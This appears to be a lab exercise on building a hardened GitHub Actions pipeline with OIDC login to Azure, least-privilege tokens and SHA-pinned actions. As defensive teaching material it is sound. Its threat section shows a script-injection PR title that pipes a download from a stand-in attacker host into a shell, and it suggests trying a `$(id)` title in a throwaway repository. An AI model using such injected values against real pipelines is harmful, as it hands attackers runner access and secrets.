# P2-02 – CI/CD with GitHub Actions

> Prerequisites: P2-01 (resource groups, ACR name decided), repository on GitHub, admin rights on it. Time: ~2 h.

## Goal
A pipeline that builds, tests, scans and deploys SecLab **without any long-lived Azure credential** and without letting an untrusted pull request touch a secret or production.

Acceptance criteria:

1. **CI workflow** on every pull request and push to `main`: `dotnet build` and `dotnet test` (the Part 1 tests, laid out as in step 16: the **unit tests first** (`--filter "Kind=Unit"`, no database), then the whole suite, which needs **SQL Server started the way you start it locally** – `docs/init-secrets.sh`, `docker compose up -d --wait sqlserver`, `docs/init-database.sh`, with the generated `.env` loaded – because since step 15 the tests demand the pinned TLS certificate, the `seclab_app` login and the migrations; a plain GitHub *service container* cannot mount that certificate), `npm ci && npm run build`, `dotnet list package --vulnerable --include-transitive` (fails the job when it finds something), **CodeQL** analysis for C# and JavaScript/TypeScript, **dependency review** on pull requests, a manually triggered or scheduled **mutation-testing** job (Stryker.NET on the security helpers, step 16; HTML report as an artifact), container image build for the API and ExternalApi (the frontend ships as a static build artifact), and an **image vulnerability scan** that fails on HIGH/CRITICAL findings.
2. **Deploy workflow** on `main`: pushes images to Azure Container Registry (tagged and deployed **by digest**), then deploys to `dev` automatically, `test` after a smoke test, and `prod` only after a **required reviewer** approves.
3. **Authentication to Azure uses OIDC federated credentials** (`azure/login`). No client secret, certificate or publish profile is stored in GitHub.
4. Every workflow and job declares the **least `permissions:`** it needs; the default token is read-only.
5. Every third-party action is **pinned to a full commit SHA** (with the version in a comment); Dependabot keeps them fresh.
6. No `${{ github.event.* }}` (or other attacker-controllable value) is interpolated directly into a `run:` script; no step prints a secret.
7. Fork pull requests get CI with **no secrets** and cannot trigger deployment. `pull_request_target` is not used to run PR code.
8. GitHub settings: `main` is protected (PR + review + required status checks, no force-push); environments `dev`, `test`, `prod` exist with environment-scoped variables; `prod` requires reviewers and only deploys from `main`.

Out of scope: the Azure resources themselves (P2-03/04); this step assumes the Bicep template from P2-04 exists or you deploy a placeholder.

## Threat / why
CI/CD is the most privileged, least watched part of the system. Concrete failures (see OWASP Top 10 CI/CD Security Risks):

- **Script injection.** A step `run: echo "Title: ${{ github.event.pull_request.title }}"` – a PR titled `"; curl https://evil.example/x | sh; #` runs on your runner, with the job's token and secrets.
- **Poisoned pipeline execution.** A workflow triggered by `pull_request_target` (which runs with secrets and a write token) that checks out and builds the fork's code hands the attacker your secrets.
- **Leaked long-lived credential.** A service-principal client secret in `secrets.AZURE_CREDENTIALS` is exfiltrated by any compromised action or step, and works from anywhere for two years.
- **Mutable action tags.** `uses: some/action@v3` – the maintainer's account is compromised and `v3` is moved to malicious code (this has happened to popular actions). A SHA cannot be moved.
- **Over-broad token.** `GITHUB_TOKEN` with `contents: write` in a test job lets a malicious dependency push to your repo.

Prove the injection risk to yourself in a throwaway repository: create a workflow that interpolates the PR title into `run:`, open a PR titled `$(id)` and read the log. Then fix it in your real workflow (Concepts explains how).

## Concepts
- **Triggers.** `pull_request` from a fork runs with a read-only token and **no secrets**. `pull_request_target` and `workflow_run` run in the context of the base repo with secrets – dangerous when combined with checking out PR code. `push` on protected branches is your trusted path.
- **`permissions:`** on workflow and job level; set the workflow default to the minimum and raise per job (`id-token: write` only for jobs that log in to Azure; `security-events: write` for CodeQL upload; `pull-requests: write` only where a bot must comment). Also set the repository default for `GITHUB_TOKEN` to read-only in Settings.
- **Secrets vs Variables vs Environments.** *Variables* (`vars.*`) are non-secret configuration (subscription id, tenant id, client id, resource names) – these identifiers are not credentials once OIDC is used. *Secrets* are for values that must stay hidden; with OIDC you should need almost none. *Environments* scope variables/secrets to a deployment target and add **protection rules**: required reviewers, wait timer, allowed deployment branches. A job referencing `environment: prod` does not receive prod values until the rules pass.
- **OIDC federation.** The runner requests a short-lived ID token from GitHub (needs `id-token: write`); Entra ID trusts it because you created a **federated identity credential** on an app registration or user-assigned managed identity whose *subject* matches the workflow (for example a repository + environment or branch). Azure issues an access token valid for about an hour. Read the subject claim formats and what the `azure/login` action needs (client id, tenant id, subscription id – all non-secret).
- **One identity per environment** with Azure RBAC scoped to that environment's resource group; a separate, narrower identity for pushing images (AcrPush on the registry only). Then a compromised `dev` job cannot touch `prod`.
- **Script-injection defence.** Pass untrusted values through `env:` and reference them as shell variables; validate; prefer actions over inline scripts for untrusted input. Secrets are masked in logs only when GitHub recognises them – never rely on that; never `echo` them, never put them in URLs or artifacts, and be careful with `set -x`.
- **Supply chain.** Pin actions by SHA; enable Dependabot for `github-actions`, `nuget`, `npm`, `docker`; dependency review blocks new vulnerable or wrongly-licensed dependencies on PRs; consider allow-listing actions in the org/repo settings ("Actions permissions").
- **Immutable artifacts.** Build once, deploy the *same digest* through dev → test → prod. Rebuilding per environment defeats testing.
- **Service containers** start a container next to the job (with health checks) and expose it on localhost.

### What lives where
| Item | GitHub Variable | GitHub Secret | Key Vault | Neither (derived at runtime) |
|------|:---:|:---:|:---:|:---:|
| Azure tenant / subscription / client id (OIDC) | x | | | |
| Resource group, ACR name, app names | x (per environment) | | | |
| Azure access token | | | | x (OIDC, minutes) |
| Azure client secret / publish profile | **never** | **never** | | |
| SQL admin password | | | | does not exist (Entra-only, P2-04) |
| Connection string with credentials | | | | does not exist (managed identity) |
| API keys for ExternalApi (Part 1 step 06), pepper, signing keys | | | x | |
| OIDC client secret for Entra app (if a confidential client is used) | | | x | |
| Data Protection key ring | | | (KEK in vault) | blob storage |
| Throwaway CI database passwords (`sa`, `seclab_app`, `seclab_migrator`) | | | | generated per run by `docs/init-secrets.sh`, never stored |
| Sonar/scanner tokens (if used) | | x (repo or org) | | |
| ZAP target URL | x | | | |

## Your turn
Tasks:
1. Create the identity/identities for GitHub in Entra (app registration or user-assigned managed identity), add **federated credentials** whose subject restricts them to your repository and to specific environments, and grant scoped RBAC (registry push; deploy to one resource group).
2. Create the GitHub environments, their variables and protection rules; protect `main`; make the default token read-only.
3. Containerize API and ExternalApi (the repo has no Dockerfiles yet): multi-stage, non-root, minimal runtime image, no secrets baked in.
4. Write `.github/workflows/ci.yml` satisfying criterion 1 – with the database set up by the repository's own scripts (see step 15) and the test layout of step 16.
5. Write `.github/workflows/deploy.yml` (and, if you like, a reusable workflow it calls for each environment) satisfying criteria 2–7.
6. Add `.github/dependabot.yml` for actions, nuget, npm and docker.
7. Run the checks below until green; then open a PR from a fork (or a second account) and confirm no secret and no deploy is available to it.

<details><summary>Hint 1 – where to look</summary>

GitHub Docs: "Security hardening for GitHub Actions", "Security hardening your deployments → OpenID Connect in Azure", "Using environments for deployment", "Managing a branch protection rule". Microsoft Learn: "Authenticate to Azure from GitHub Actions by OpenID Connect". The `azure/login` README.
</details>

<details><summary>Hint 2 – which features</summary>

Actions: `actions/checkout`, `actions/setup-dotnet`, `actions/setup-node`, `github/codeql-action` (init, autobuild or manual build, analyze), `actions/dependency-review-action`, `docker/setup-buildx-action`, `docker/build-push-action` (or `az acr build`), a scanner such as `aquasecurity/trivy-action`, `azure/login`, Azure CLI (`az deployment group create`, `az containerapp`). Keys: `permissions`, `concurrency`, `services:` with `options: --health-cmd`, `environment:`, `needs`, `if: github.ref == 'refs/heads/main'`, `timeout-minutes`. CLI: `az ad app federated-credential create`, `az role assignment create`, `gh api` for environments and branch protection. Check the current major version of every action.
</details>

<details><summary>Hint 3 – shape of the solution</summary>

`ci.yml`: workflow-level `permissions: contents: read`; jobs `backend` (unit tests, then `init-secrets.sh` + compose SQL Server + `init-database.sh` + the whole suite, vulnerable-package check), `mutation` (manual/scheduled), `frontend`, `codeql` (matrix over languages, extra `security-events: write`), `dependency-review` (PR only), `images` (build without push, scan). `deploy.yml`: triggered by `push` to `main` (and `workflow_dispatch`), job `build-push` in a low-privilege environment with `id-token: write` that outputs image digests; then `deploy-dev` -> `deploy-test` -> `deploy-prod`, each `environment: <name>`, each logging in with that environment's client id, running `what-if` then the deployment with the digest, then a smoke test. Untrusted strings only through `env:`.
</details>

## Verify
Static checks (no cloud needed):
```bash
actionlint .github/workflows/*.yml                     # syntax, expression and shell issues
yamllint -d relaxed .github/workflows/                 # or the python yaml.safe_load one-liner
grep -RInE 'uses: [^ ]+@(v[0-9]|main|master)' .github/workflows   # must print nothing: all pinned to SHAs
grep -RInE '\$\{\{ *github\.(event|head_ref)[^}]*\}\}' .github/workflows | grep -v 'env:' # inspect: none inside run:
grep -RIn 'pull_request_target' .github/workflows      # must print nothing (or be justified)
grep -RInE 'AZURE_CREDENTIALS|client-secret|publish-profile' .github/workflows   # must print nothing
```
Run the test job locally with `act` (`act pull_request -j backend`, needs Docker; docker-in-docker caveats apply for the compose-started database; some marketplace actions behave differently) – or push to a branch and read the run.

GitHub settings asserted with the API (needs `gh auth login` with admin rights):
```bash
gh api repos/{owner}/{repo}/environments/prod --jq '.protection_rules[] | select(.type=="required_reviewers") | .reviewers | length'   # >= 1
gh api repos/{owner}/{repo}/environments/prod --jq '.deployment_branch_policy'                # protected_branches or custom policy, not null
gh api repos/{owner}/{repo}/branches/main/protection --jq '{reviews: .required_pull_request_reviews.required_approving_review_count, checks: .required_status_checks.contexts, force: .allow_force_pushes.enabled}'
gh api repos/{owner}/{repo}/actions/permissions/workflow --jq '.default_workflow_permissions'  # "read"
gh secret list; gh variable list -e prod                                                        # no Azure credential in secrets
az ad app federated-credential list --id <app-object-id> --query "[].subject"                   # only repo:<owner>/<repo>:environment:<name>
```
Run evidence: a green `ci` run on a PR; a `deploy` run that pauses at `prod` awaiting approval; the `azure/login` step logs "Login successful" with no secret input.

Checklist:
- [ ] `actionlint` reports nothing; grep checks above are clean
- [ ] Unit tests run before the database is started, the SQL-dependent tests run and pass afterwards (look for the `docker compose` step and `init-database.sh` in the job log); the mutation job can be started by hand and uploads its report
- [ ] Deliberately add a vulnerable package (or an old base image) on a branch: the pipeline fails; remove it again
- [ ] Fork PR: CI runs, `deploy` does not, no secret is readable
- [ ] `prod` deployment waits for a reviewer and refuses to run from a non-`main` branch
- [ ] Federated credentials exist per environment; **no** client secret exists on the app registration (`az ad app credential list --id <id>` is empty)
- [ ] Deployed image digest equals the digest built in CI (compare in the run summary and `az containerapp show`)

## Pitfalls
- The federated credential **subject must match exactly** (case, `environment:` vs `ref:`). `AADSTS70021`/"No matching federated identity record" almost always means a subject mismatch – decode the token claims by printing non-secret parts of the job context, not the token.
- A job that sets `environment:` gets the *environment* subject; a job without it gets the branch/PR subject. Create the credentials for the subjects you actually use.
- `id-token: write` on the whole workflow gives every job (and every action in it) the ability to mint tokens. Scope it to the deploy jobs.
- Environment secrets are unavailable to jobs that do not name the environment; required reviewers can also approve *their own* deployments unless "prevent self-review" is enabled.
- Pinned SHA must be from the action's own repository, not a fork – verify on the release page.
- Service container SQL Server needs the EULA env var, time to start (health check) and enough memory; tests failing with login timeouts usually mean it was not ready.
- Caches (`actions/cache`, setup-* caching) written by untrusted PR runs can poison later runs; do not restore caches in deploy jobs.
- Do not "fix" a failing vulnerability check by disabling it; suppress a specific finding with a documented expiry.
- A Dependabot PR is a PR: it does not get secrets by default (separate Dependabot secrets store). Good.

## Further reading
- GitHub Docs: Security hardening for GitHub Actions; Secure use reference – https://docs.github.com/actions/security-guides
- GitHub Docs: OpenID Connect in Azure – https://docs.github.com/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure
- Microsoft Learn: Deploy to Azure using GitHub Actions – https://learn.microsoft.com/azure/developer/github/
- `azure/login`, `github/codeql-action`, `actions/dependency-review-action` READMEs (check the current version)
- OWASP Top 10 CI/CD Security Risks; OWASP Software Component Verification Standard; SLSA framework

Stuck or done? Compare with the solution: [`docs/solutions/p2-02-github-actions-pipeline.md`](../solutions/p2-02-github-actions-pipeline.md) and `solutions/p2-02-pipeline/`.
